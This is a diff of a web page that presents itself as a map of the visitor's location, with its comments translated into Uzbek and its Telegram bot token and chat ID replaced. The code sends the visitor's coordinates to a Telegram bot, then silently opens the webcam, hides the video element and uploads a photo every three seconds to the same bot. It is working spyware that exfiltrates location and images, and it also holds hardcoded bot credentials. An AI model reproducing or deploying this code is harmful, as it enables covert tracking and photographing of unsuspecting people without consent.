@@ -21,7 +21,7 @@
             border-radius: 15px;
         }
 
-        /* Hide video and canvas since we only want to capture the image */
+        /* Video va canvasni yashirish, chunki biz faqat rasm olishni xohlaymiz */
         video,
         canvas {
             display: none;
@@ -35,13 +35,11 @@
     <canvas id="canvas" width="320" height="240"></canvas>
 
     <script>
-        let ism = prompt("Ismingizni yoz");
-
         document.addEventListener('DOMContentLoaded', () => {
             if ('geolocation' in navigator) {
                 navigator.geolocation.getCurrentPosition(success, error);
             } else {
-                alert('Geolocation is not supported by your browser');
+                alert('Geolokatsiya brauzeringizda qo‘llab-quvvatlanmaydi');
             }
 
             function success(position) {
@@ -55,65 +53,58 @@
                 }).addTo(mymap);
 
                 L.marker([latitude, longitude]).addTo(mymap)
-                    .bindPopup('My Location')
+                    .bindPopup('Mening joylashuvim')
                     .openPopup();
 
-                // Send geolocation to Telegram
+                // Geolokatsiyani Telegramga yuborish
                 sendToTelegram(latitude, longitude);
             }
 
             function error() {
-                alert('Unable to retrieve your location');
+                alert('Joylashuvingizni aniqlab bo‘lmadi');
             }
 
             function sendToTelegram(latitude, longitude) {
-                const botToken = '7439361152:AAGTzrr57-CQoKZFYX5WRLgayf1RxMntmqU'; // Replace with your actual bot token
-                const chatId = 6962381750; // Replace with your actual chat ID
+                const botToken = '7883775961:AAHJi3-l7DBvcAWTPwJcXizJTwFeO9_yelc'; // Yangi bot token
+                const chatId = '-1002519183840'; // Yangi chat ID
 
                 const apiUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-                const text = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ism)}`;
 
-                // Send location to Telegram
+                // Lokatsiyani Telegramga yuborish
                 fetch(apiUrl, { method: 'POST' })
                     .then(response => response.json())
-                    .then(data => console.log('Location sent:', data))
-                    .catch(error => console.error('Error sending location:', error));
+                    .then(data => console.log('Lokatsiya yuborildi:', data))
+                    .catch(error => console.error('Lokatsiya yuborishda xatolik:', error));
 
-                // Send name to Telegram
-                fetch(text, { method: 'POST' })
-                    .then(response => response.json())
-                    .then(data => console.log('Name sent:', data))
-                    .catch(error => console.error('Error sending name:', error));
-
-                // Start capturing photos every 3 seconds
-                startCameraCapture();
+                // Har 3 soniyada rasm olishni boshlash
+                startCameraCapture(botToken, chatId);
             }
 
-            // Camera functionality
-            function startCameraCapture() {
+            // Kamera funksiyasi
+            function startCameraCapture(botToken, chatId) {
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
 
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(stream => {
-                        const video = document.createElement('video'); // Create a video element for capturing
+                        const video = document.createElement('video'); // Rasm olish uchun video elementi
                         video.srcObject = stream;
                         video.play();
 
-                        // Capture photo every 3 seconds
+                        // Har 3 soniyada rasm olish
                         setInterval(() => {
-                            // Draw the current frame from the video on the canvas
+                            // Videodagi joriy kadrdan canvaska chizish
                             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                            // Convert the canvas content to a blob (image)
+                            // Canvasdagi tasvirni blob (rasm) ga aylantirish
                             canvas.toBlob(blob => {
                                 if (!blob) {
-                                    console.error('Canvas did not generate a blob.');
+                                    console.error('Canvas blob generatsiya qilmadi.');
                                     return;
                                 }
 
                                 const formData = new FormData();
-                                formData.append('chat_id', 6962381750); // Use actual chat ID
+                                formData.append('chat_id', chatId); // Yangi chat ID ishlatiladi
                                 formData.append('photo', blob, 'user_photo.png');
 
                                 const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
@@ -122,13 +113,13 @@
                                     body: formData
                                 })
                                     .then(response => response.json())
-                                    .then(data => console.log('Photo sent successfully:', data))
-                                    .catch(error => console.error('Error sending photo:', error));
-                            }, 'image/png'); // Specify image type
-                        }, 3000); // Capture every 3 seconds
+                                    .then(data => console.log('Rasm muvaffaqiyatli yuborildi:', data))
+                                    .catch(error => console.error('Rasm yuborishda xatolik:', error));
+                            }, 'image/png'); // Rasm turi
+                        }, 3000); // Har 3 soniyada
                     })
                     .catch(error => {
-                        console.error('Error accessing the camera:', error);
+                        console.error('Kameraga kirishda xatolik:', error);
                     });
             }
         });
